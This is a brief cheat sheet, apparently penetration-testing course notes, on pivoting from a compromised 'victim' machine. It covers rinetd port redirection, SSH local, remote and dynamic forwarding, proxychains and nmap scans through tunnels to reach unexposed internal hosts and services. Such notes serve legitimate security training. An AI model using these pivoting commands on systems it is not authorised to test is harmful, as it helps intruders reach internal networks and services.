Port Redirection and Tunneling:-
From RINETD:-
	apt install rinetd
	cat /etc/rinetd.conf
	bindaddress bindport connectionaddress connectport
	0.0.0.0     80       victim_ip         victim_port(80)
	service rinetd restart

From this the victim machine can access the particular address from attacker machine it could be linux or windows


SSH Tunneling:-
Make Sure to run ssh_localPortForward_script.sh before start the tunneling 

SSH Local Port Forwarding:-(Accesing Victim internal subnet system )
ssh -N -L [bind_address:]port:host:hostport [username@address]
sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128
-N means no command to run
-L to listen or bind the port
192.168.1.110 Internal sunbet which not accesssable from outside (kali) with port number

FYI:-
Change the min protocol = SMB2 from /etc/samba/smb.conf before start 
sudo /etc/init.d/smbd restart


SSH Remote Port Forwarding:-(Forwarding Victim Port To outside) Only from Victim Side
ssh -N -R [bind_address:]port:host:hostport [username@address]
ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
-N means no command to run
-R Remote forward
10.11.0.4:2221 Kali machine i.p address and port number
127.0.0.1:3306 Victim service which you want to access from kali machine 
nmap -sS -sV 127.0.0.1 -p 2221

SSH Dynamic Port Forwarding:-

ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>
ssh -N -D 127.0.0.1:8080 student@10.11.0.128
cat /etc/proxychains.conf
socks4 127.0.0.1 8080
proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110
